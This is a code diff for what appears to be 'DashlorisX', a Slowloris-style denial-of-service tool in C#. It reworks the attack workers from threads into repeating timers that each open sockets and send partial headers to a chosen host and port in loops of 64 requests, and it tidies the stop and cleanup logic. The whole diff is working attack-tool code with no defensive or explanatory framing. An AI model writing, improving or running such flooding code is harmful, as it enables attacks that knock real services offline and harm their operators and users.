@@ -73,10 +73,10 @@ namespace DashlorisX
 	    }
 	}
 
-	readonly List<Thread> InnerDashBots = new List<Thread>();
-	readonly List<Thread> DashBots = new List<Thread>();
-	
+	readonly List<System.Timers.Timer> InnerDashBots = new List<System.Timers.Timer>();
+
 	readonly List<Socket> Stockings = new List<Socket>();
+	readonly List<Thread> DashBots = new List<Thread>();
 
 	string host = string.Empty;
 	string port = string.Empty;
@@ -142,19 +142,6 @@ namespace DashlorisX
 	    {
 		DashBots[DashBots.Count - 1].IsBackground = true;
 		DashBots[DashBots.Count - 1].Start();
-
-		DashBots.Clear();
-	    }
-	}
-
-	private void StartInnerDashBots()
-	{
-	    foreach (Thread DashBot in InnerDashBots)
-	    {
-		if (DashBots.IndexOf(DashBot) != 0)
-		{
-		    DashBot.Start();
-		}
 	    }
 	}
 
@@ -174,53 +161,37 @@ namespace DashlorisX
 
 		KeepAlive = true;
 
-		DashBots.Add(new Thread(() =>
-		{
-		    for (int k = 0; k < 32; k += 1)//worker integration
+		DashBots.Add
+		(
+		    new Thread(() => 
 		    {
-			InnerDashBots.Add(new Thread(() =>
+			for (int k = 0; k < 32; k += 1)//worker integration
 			{
-			    while (KeepAlive)
+			    var InnerDashBot = new System.Timers.Timer(8000) { AutoReset = true }; //send interval
+
+			    if (!KeepAlive)
+			    {
+				break;
+			    }
+
+			    InnerDashBot.Elapsed += (s, e) =>
 			    {
 				for (int request = 0; request < 64; request += 1)
 				{
-				    if (!KeepAlive)
-				    {
-					break;
-				    }
-
 				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
 				    {
-					if (!KeepAlive)
-					{
-					    break;
-					}
-
 					SendHeader(GetSocket());
 				    }
 
-				    if (!KeepAlive)
-				    {
-					break;
-				    }
-
-				    Thread.Sleep(2000);//inner interval integration
+				    Thread.Sleep(2000);
 				}
+			    };
 
-				if (!KeepAlive)
-				{
-				    break;
-				}
-
-				Thread.Sleep(8000);//interval integration
-			    }
-			}));
-
-			Thread.Sleep(250);//worker portion startup delay
-		    }
-
-		    StartInnerDashBots();
-		}));
+			    InnerDashBot.Start();
+			    InnerDashBots.Add(InnerDashBot);
+			}
+		    })
+		);
 
 		StartLatestDashBot();
 		StartTimer();
@@ -248,6 +219,9 @@ namespace DashlorisX
 	    SafeTimer.Elapsed += (s, e) =>
 	    {
 		DashlorisX.Launch.Text = "Launch";
+		LogLog.Stop.Text = "Stop";
+
+		LogLog.Hide();
 	    };
 	}
 
@@ -255,11 +229,31 @@ namespace DashlorisX
 	{//Asynchronously?
 	    DashlorisX.Launch.Text = "Stopping ....";
 
-	    LogSend($"Stop signal received, stopping {DashBots.Count} bots and disconnecting {Stockings.Count} connections ....");
+	    LogSend($"Stop signal received, stopping {InnerDashBots.Count} bots and disconnecting {Stockings.Count} connections ....");
 
 	    try
 	    {
 		KeepAlive = false;
+
+		foreach (var InnerDashBot in InnerDashBots)
+		{
+		    if (InnerDashBot != null)
+		    {
+			InnerDashBot.Dispose();
+		    }
+		}
+
+		InnerDashBots.Clear();
+
+		foreach (Thread DashBot in DashBots)
+		{
+		    if (DashBot != null)
+		    {
+			DashBot.Abort();
+		    }
+		}
+
+		DashBots.Clear();
 
 		foreach (Socket Stocking in Stockings)
 		{
@@ -276,17 +270,13 @@ namespace DashlorisX
 
 		Stockings.Clear();
 
-		foreach (Thread InnerDashBot in InnerDashBots)
+		if (DashTimer != null)
 		{
-		    InnerDashBot.Abort();
-		}
-
-		InnerDashBots.Clear();
-
-		if (DashTimer.Enabled)
-		{
-		    DashTimer.Stop();
-		    DashTimer = null;
+		    if (DashTimer.Enabled)
+		    {
+			DashTimer.Stop();
+			DashTimer = null;
+		    }
 		}
 
 		StartSafeTimer();
